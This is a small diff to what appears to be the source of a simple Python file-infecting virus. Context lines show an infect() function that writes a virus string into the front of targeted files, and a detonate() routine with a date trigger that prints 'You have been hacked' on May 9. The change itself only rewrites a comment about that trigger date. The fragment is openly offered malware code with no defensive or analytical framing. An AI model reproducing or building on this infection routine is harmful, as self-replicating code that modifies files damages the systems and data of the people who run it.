@@ -51,8 +51,7 @@ def infect(files_targeted):
         f.write(virusstring + temp)
         f.close()
 # Finally, the script gives the user feedback (how nice?)
-def detonate(): # the datetime will most certainly be now-now (like in 
-SpaceBalls)
+def detonate(): # the datetime will execute on May 9th
     if datetime.datetime.now().month == 5 and datetime.datetime.now().
 day == 9:
         print "You have been hacked"
